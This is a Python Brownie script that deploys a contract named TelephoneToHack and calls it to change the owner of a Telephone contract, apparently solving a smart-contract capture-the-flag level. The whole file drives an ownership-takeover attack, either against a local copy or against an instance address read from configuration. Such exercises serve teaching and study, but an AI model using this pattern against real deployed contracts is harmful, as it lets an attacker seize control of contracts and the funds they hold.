from brownie import Telephone, TelephoneToHack, network, config
from scripts.helpers import LOCAL_BLOCKCHAIN_ENVIRONMENTS, get_account, deploy_contract


def deploy_telephone_contracts(account_to_hack):

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        account_to_deploy = get_account(1)
        telephone_contract = deploy_contract(Telephone, account_to_deploy)
    else:
        telephone_contract = ""

    # deploy hacking contract   
    account_to_hack = get_account()
    telephone_hack_contract = deploy_contract(TelephoneToHack, account_to_hack)

    return telephone_hack_contract, telephone_contract


def hack_telephone_contracts(account_to_hack, telephone_hack_contract, telephone_contract):
    # get the address of the telephone contract to be hacked:
    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        telephone_contract_address = telephone_contract.address
    else:
        telephone_contract_address = config["networks"][network.show_active()]["telephone_instance"]
    # perform hack, i.e. change the owner 
    print("Setting instance..")  
    telephone_hack_contract.setInstance(telephone_contract_address, {"from": account_to_hack})
    print("Changing the owner..")
    telephone_hack_contract._changeOwner(account_to_hack, {"from": account_to_hack})

    return telephone_hack_contract


def main():
    account_to_hack = get_account()
    telephone_hack_contract, telephone_contract = deploy_telephone_contracts(account_to_hack)
    hack_telephone_contracts(account_to_hack, telephone_hack_contract, telephone_contract)



    